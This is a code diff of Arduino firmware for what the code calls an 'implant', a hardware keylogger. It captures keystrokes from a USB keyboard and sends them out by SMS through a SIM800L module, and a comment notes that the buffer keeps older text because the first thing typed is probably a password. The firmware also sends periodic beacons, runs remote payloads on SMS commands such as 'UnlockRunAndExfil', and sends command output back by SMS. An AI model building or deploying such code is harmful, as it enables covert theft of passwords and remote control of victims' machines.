@@ -41,11 +41,11 @@ void setup(){
 #ifndef DEBUGWITHOUTSIM
   SMSSERIAL.begin(BAUD_RATE_SIM800L);
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
-  SMSSERIAL.write("AT\r\n");
+  SMSSERIAL.println(F("AT"));
   readResponse();
 
   // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
-  SMSSERIAL.write("AT+CMGF=1\r\n");
+  SMSSERIAL.println(F("AT+CMGF=1"));
   readResponse();
 
 #ifdef DEBUG
@@ -62,10 +62,10 @@ void loop(){
   // Send a beacon so we know that the implant is up
   // ToDo: this can infere with payloads execution. Use only when user is not typing
   if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
-      String msg = "Beacon - ";
+      String msg = F("Beacon - ");
       msg += IMPLANT_NAME;
 #ifdef DEBUG
-      Serial.println("Sending beacon");
+      Serial.println(F("Sending beacon"));
 #endif
       sendSMSMessage(msg);
       previousMillisBeacon = currentMillis;
@@ -79,24 +79,28 @@ void loop(){
       }
     }
     else{
-      buffer_keystrokes += (char)captured_key;
+      // Arduino doesn't have a lot of memory, so we need to define a max size for the buffer
+      // if more characters arrive after the buffer if full it discards them (we prioritize older 
+      /// text because prob the first thing typed is the password) 
+      if (buffer_keystrokes.length() < MAX_BUFFER_SIZE)
+        buffer_keystrokes += (char)captured_key;
     }
     previousMillis = currentMillis;  
   }
 
   //SMS send
-  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
+  if (buffer_keystrokes.length() >= SMS_CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
     if (!pendingSMS){
       // The buffer could hold a lot of characters from previous SMS that couldn't be sent
       String bufferToSend = "";
-      if (buffer_keystrokes.length() < CHAR_LIMIT - 1){
+      if (buffer_keystrokes.length() < SMS_CHAR_LIMIT - 1){
         bufferToSend = buffer_keystrokes;
       }
       else{
-        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
+        bufferToSend = buffer_keystrokes.substring(0, SMS_CHAR_LIMIT - 1);
       }
 #ifdef DEBUG
-      Serial.println("Trying to send message with content: " + bufferToSend);
+      Serial.println(F("Trying to send message with content: ") + bufferToSend);
 #endif
       
       sendSMSMessage(bufferToSend);
@@ -105,7 +109,7 @@ void loop(){
     } 
     else{
 #ifdef DEBUG
-      Serial.println("There is a SMS pending to be sent...");
+      Serial.println(F("There is a SMS pending to be sent..."));
 #endif
     }
   }
@@ -115,11 +119,11 @@ void loop(){
     if (SMSSERIAL.available()){
       String res = SMSSERIAL.readString();
 #ifdef DEBUG
-      Serial.println("Message read from SMSSERIAL: " + res);
+      Serial.println(F("Message read from SMSSERIAL: ") + res);
 #endif
-      if (res.indexOf("CMGS: ") > 0){
+      if (res.indexOf(F("CMGS: ")) > 0){
 #ifdef DEBUG
-        Serial.println("SMS message succesfully sent");
+        Serial.println(F("SMS message succesfully sent"));
 #endif
         pendingSMS = false;
         
@@ -129,10 +133,10 @@ void loop(){
         buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
       }
       // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
-      else if (res.indexOf("ERROR: ")){
+      else if (res.indexOf(F("ERROR: "))){
         // The SMS couldn't be sent, we need to retry
 #ifdef DEBUG
-        Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
+        Serial.println(F("Trying to send message with content: ") + buffer_keystrokes.substring(0, pendingLength));
 #endif
         sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
       }
@@ -147,7 +151,7 @@ void loop(){
 #endif
 
 #ifdef DEBUG
-    Serial.println("new SMS");
+    Serial.println(F("new SMS"));
 #endif
 
     String SMS = SMSSERIAL.readString();      
@@ -155,11 +159,11 @@ void loop(){
     //We wait a little bit so the OS has time to identify the keyboard
     delay(30000);
     // To simulate a real SMS:
-    SMS = "+CMT: blablabla\r\n";
+    SMS = F("+CMT: blablabla\r\n");
     SMS += DEBUGWITHOUTSIM_PAYLOAD;
 #endif
 
-    if(SMS.indexOf("+CMT: ") > -1){ // We got a command
+    if(SMS.indexOf(F("+CMT: ")) > -1){ // We got a command
       String SMS_text;
       // Code to remove last new line if exists
       if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
@@ -168,40 +172,42 @@ void loop(){
       int new_line_pos = SMS.indexOf("\r\n", 2);
       SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
 #ifdef DEBUG
-      Serial.println("Received SMS with content:");
+      Serial.println(F("Received SMS with content:"));
       Serial.println(SMS_text);
 #endif
       String payload = getValue(SMS_text, SEPARATOR, 0);
   
 #ifdef DEBUG
       if(payload.length() > 0){
-        Serial.println("Got payload: " + payload);
+        Serial.println(F("Got payload: ") + payload);
       }
 #endif
       
-      if (payload == "UnlockDownload"){
+      if (payload == F("UnlockDownload")){
         unlockDownload(SMS_text);
       }
-      else if(payload == "UnlockRunAndExfil"){
+      else if(payload == F("UnlockRunAndExfil")){
         unlockRunAndExfil(SMS_text);
       }
-      else if(payload == "Manual"){
+      else if(payload == F("Manual")){
         manualPayload(SMS_text);
       }
       else{
-  #ifdef DEBUG
-        Serial.println("Unknown payload " + payload); 
-  #endif
+#ifdef DEBUG
+        Serial.print(F("Unknown payload "));
+        Serial.println(payload); 
+#endif
         sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
       }
-      // After execute a fake payload it does a sleep
 #ifdef DEBUGWITHOUTSIM
+      // After execute a fake payload it does a sleep
       delay(30000);
 #endif
     }
     else {
 #ifdef DEBUG
-      Serial.println("Receive something that is not an SMS: " + SMS);
+      Serial.print(F("Receive something that is not an SMS: "));
+      Serial.println(SMS);
 #endif
     }
   }
@@ -210,6 +216,6 @@ void loop(){
   // This is used to exfil the result of commands
   if (Serial.available()) {
     String output = Serial.readString();
-    sendSMSMessage("Ex: " + output);
+    sendSMSMessage("Ex:" + output);
   }
 }
